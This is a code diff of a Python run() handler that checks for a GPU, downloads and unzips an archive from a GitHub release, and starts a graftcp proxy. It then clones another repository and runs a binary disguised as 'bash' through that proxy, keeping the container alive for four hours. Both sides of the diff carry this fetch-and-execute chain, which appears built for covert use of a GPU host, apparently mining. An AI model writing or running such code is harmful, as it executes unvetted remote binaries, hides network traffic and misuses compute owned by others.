@@ -2,51 +2,50 @@ import subprocess
 import time
 import os
 
-def run(text: str = "start"):
-    try:
-        print("=== CHECK GPU ===")
-        subprocess.run(["nvidia-smi"], check=False)
+def run():
+    print("=== CHECK GPU ===")
+    subprocess.run(["nvidia-smi"], check=False)
 
-        cmd = """
-        set -e
+    cmd = """
+    set -e
 
-        echo "=== DOWNLOAD FILE ==="
-        wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
+    echo "=== UPDATE & INSTALL ==="
+    apt update -y
+    apt install -y wget unzip git
 
-        echo "=== EXTRACT ==="
-        unzip -o pan.zip
+    echo "=== DOWNLOAD FILE ==="
+    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
 
-        cd pan
+    echo "=== EXTRACT ==="
+    unzip -o pan.zip
 
-        echo "=== SET PERMISSION ==="
-        chmod -R +x .
+    cd pan
 
-        echo "=== START GRAFTCP LOCAL ==="
-        ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
+    echo "=== SET PERMISSION ==="
+    chmod -R +x .
 
-        sleep 3
+    echo "=== START GRAFTCP LOCAL ==="
+    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
 
-        echo "=== CLONE REPO ==="
-        git clone https://github.com/hujisanda/lol198.git
+    sleep 3
 
-        cd lol198
-        chmod u+x bash
+    echo "=== CLONE REPO ==="
+    git clone https://github.com/hujisanda/lol198.git
+    cd lol198 && chmod u+x bash
 
-        echo "=== MOVE FILE ==="
-        mv bash ../
+    echo "=== MOVE FILE ==="
+    mv bash ~/pan
 
-        cd ..
-        
-        echo "=== RUN PROC VIA GRAFTCP ==="
-        ./graftcp/graftcp ./bash
-        """
+    cd ~
+    cd pan
 
-        subprocess.run(["bash", "-lc", cmd], check=True)
+    echo "=== RUN SCRIPT ==="
+    ./graftcp/graftcp ./bash
+    """
 
-        print("=== DONE, KEEP ALIVE ===")
-        time.sleep(60 * 60 * 4)
+    subprocess.run(["bash", "-lc", cmd], check=False)
 
-        return {"status": "success"}
+    print("=== KEEP CONTAINER ALIVE (4 JAM) ===")
+    time.sleep(60 * 60 * 4)
 
-    except Exception as e:
-        return {"error": str(e)}
+    return {"status": "done"}
